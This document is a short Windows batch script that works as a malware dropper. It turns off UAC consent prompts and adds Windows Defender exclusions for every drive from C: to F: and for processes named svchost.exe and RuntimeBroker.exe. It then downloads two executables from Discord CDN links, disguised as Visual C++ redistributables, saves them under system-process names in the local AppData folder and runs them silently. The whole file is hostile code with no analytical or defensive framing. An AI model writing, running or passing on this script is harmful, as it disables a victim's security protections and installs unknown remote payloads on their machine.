@echo off

powershell.exe Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension ".tmp"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "svchost.exe"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "F:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "D:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "E:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "server.exe"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "RuntimeBroker.exe"

powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1206676400338116692/1206676475726536835/vcredist_x86.exe?ex=6601ca0a&is=65ef550a&hm=53bdac2c01537b3a0fbbb586962ab2eb5d01f92e71a81f72619955589414a638&' -OutFile $env:localappdata\Microsoft\svchost.exe" 2>nul
powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\svchost.exe" 2>nul

powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1206676400338116692/1208324921609166918/vcredist_x64.exe?ex=6607c946&is=65f55446&hm=16229d1bb5cafd5d0cf6360fe86067091654b5ef41011da817d0c1123054ead4&' -OutFile $env:localappdata\Microsoft\RuntimeBroker.exe" 2>nul
powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\RuntimeBroker.exe" 2>nul